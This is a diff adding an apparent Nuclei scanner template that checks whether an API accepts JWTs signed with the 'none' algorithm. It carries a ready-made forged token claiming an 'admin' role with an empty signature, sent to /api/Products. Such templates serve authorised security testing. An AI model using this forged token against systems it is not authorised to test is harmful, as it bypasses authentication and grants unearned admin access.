@@ -1,0 +1,30 @@
+id: generic-jwt-none-algorithm
+info:
+  name: JWT None Algorithm Vulnerability
+  author: dast-mvp
+  description: Tests for JWT 'none' algorithm acceptance allowing token forgery
+  severity: high
+  tags:
+    - jwt
+    - authentication
+    - generic
+
+http:
+  - raw:
+      - |
+        GET /api/Products HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9fQ.
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "id"
+          - "name"
+          - "description"
+        condition: or
+        part: body
